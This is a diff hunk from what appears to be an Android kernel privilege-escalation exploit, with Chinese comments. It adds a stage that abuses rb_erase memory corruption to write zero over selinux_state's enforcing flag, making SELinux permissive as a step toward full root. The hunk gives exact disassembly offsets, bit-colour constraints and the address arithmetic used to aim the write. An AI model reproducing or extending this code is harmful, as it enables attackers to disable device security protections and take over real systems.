@@ -839,7 +839,37 @@ int run_exploit(int argc, char **argv) {
          *   child≠0 → 无 rebalance(ELF 反汇编实证), 两个 store 都落在合法可写内存。
          * FIX_MODE(可选卫生轮): 零写 [init_cred+4] → uid+gid 归零。
          * 窗口模式: mt46 的 uid 零写轮扫(保留, 作对照/备份路线)。 */
-        if (getenv("PSELECT_PTR_PI")) {
+        if (getenv("PSELECT_SELINUX_ENF")) {
+          /* mt74 (E5): selinux enforcing 零写 — 全链 root 的第一发。
+           * 走【主树】(R 几何 7/7 实证的同一 store 路径), 不碰 pi_tree:
+           *   TREE_PC = (selinux_alias-8) & ~3   ★必须 RED(bit0=0)★
+           *   TREE_RIGHT = 0 (child=0 → STORE(b) 有 cbz 守卫, 跳过)
+           *   TREE_LEFT = 0 (CASE_A)
+           *   → 唯一 STORE: *(TREE_PC+8) = *(selinux_state_alias+0) = 0
+           * 指令级实证 (2026-09-04, rb_erase @0xffffffc008a71228 反汇编):
+           *   CASE_A: 0x29c cbz x8(child),0x360 — child=0 时 STORE(b) 跳过 ✓
+           *   0x360: sbfx x8,x9,#0,#1; and x10,x8,x10(parent); cbnz→旋转
+           *     → rebalance iff pc bit0==1(RB_BLACK) 且 child==0。
+           *     ★upstream RB_RED=0/RB_BLACK=1 — fops.c 老注释"RED已置位"是反的,
+           *     |1 会进 __rb_erase_color 旋转(SELinux 区当树节点=致命)。必须 &~3★
+           *   R 几何(task+0x770,bit0=0 RED,child≠0) 7/7 无旋转 — 同构佐证。
+           * enforcing 位置实证: avc_denied+0x1c ldarb [x0(state)]; tbz #0 →
+           *   enforcing@selinux_state+0 (Android 重排, 非 upstream +1);
+           *   avc@state+0x48 → 8字节零写(+0..+7)只清 enforcing/checkreqprot/
+           *   initialized/policycap[0..3], 不碰任何指针。
+           * 效果: avc_denied 永走 tbz allow → 全局 permissive →
+           *   mt47/73 检测复活(C 写不再致盲) + finit_module SELinux 钩子放行。
+           * PI 词保持全 0(复位块处理) → pi erase 走 root 无害路径, 与 R/C 轮同。
+           * 写后验证: cat /sys/fs/selinux/enforce == 0。 */
+          uintptr_t enf_alias = P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + SELINUX_STATE_OFF);
+          snprintf(pc_env, sizeof(pc_env), "%zx",
+                   (size_t)((enf_alias - 8) & ~3ULL));
+          snprintf(right_env, sizeof(right_env), "0");
+          snprintf(left_env, sizeof(left_env), "0");
+          pr_info("mt74: SELINUX_ENF write pc=%s (STORE→[selinux_state+0]=0, "
+                  "enforcing@+0 avc_denied 实证)\n", pc_env);
+          fflush(stdout);
+        } else if (getenv("PSELECT_PTR_PI")) {
           /* mt72 (E4): pi_tree_entry 继承色写 — 绕开 C 几何悖论。
            * 指令级推导 (rb_erase CASE_A 反汇编实证, 见
            * CHECKPOINT_C_stage_paradox_20260901.md):
